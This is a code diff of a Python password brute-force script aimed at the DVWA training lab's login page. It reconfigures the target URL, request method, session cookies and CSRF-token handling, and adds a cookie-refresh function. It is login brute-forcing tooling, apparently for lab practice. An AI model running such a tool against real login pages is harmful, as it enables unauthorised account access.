@@ -22,21 +22,31 @@ by Parag Dhali
 display_ascii_art()
 
 # Target website and login path
-TARGET_URL = "http://192.168.0.100/DVWA/vulnerabilities/brute/"  # Replace with the actual target
+TARGET_URL = "http://localhost/DVWA/vulnerabilities/brute/"  # Replace with the actual target
 USERNAME = "admin"  # Change if needed
 PASSWORD_FILE = "password_list.txt"  # Path to the password list
 CSRF_TOKEN_FIELD_NAME = "user_token"  # Initialize CSRF token field name from the user
-REQUEST_METHOD = "GET"  # Initialize request method from the user (GET or POST)
+REQUEST_METHOD = "POST"  # Initialize request method from the user (GET or POST)
 USERNAME_FIELD_NAME = "username"  # Initialize username field name from the user
 PASSWORD_FIELD_NAME = "password"  # Initialize password field name from the user
-EXTRA_FIELDS = {"Login": "login"}  # Add extra fields as query string from the user
+EXTRA_FIELDS = {"Login":"Login"}  # Add extra fields as query string from the user
 
 # Start a session to maintain cookies
 session = requests.Session()
 
 # Initialize the first cookie from the user
-initial_cookie = {"PHPSESSID": "tqq5rc5mci3bedetr9s97pnsah", "security": "high"}  # Replace with actual cookie values
+# Initialize the first cookie from the user
+initial_cookie = {"security": "impossible","PHPSESSID":"8v029g60siqf401k1lmgqmb8pm"}  # Replace with the actual initial cookie value
 session.cookies.update(initial_cookie)
+
+def update_initial_cookie():
+    """Fetch the initial cookie from the login page and update the session cookies."""
+    response = session.get(TARGET_URL)
+    new_cookie = response.cookies.get_dict()
+    session.cookies.update(new_cookie)
+
+# Update the initial cookie
+update_initial_cookie()
 
 def get_csrf_token():
     """Fetch the CSRF token from the login page."""
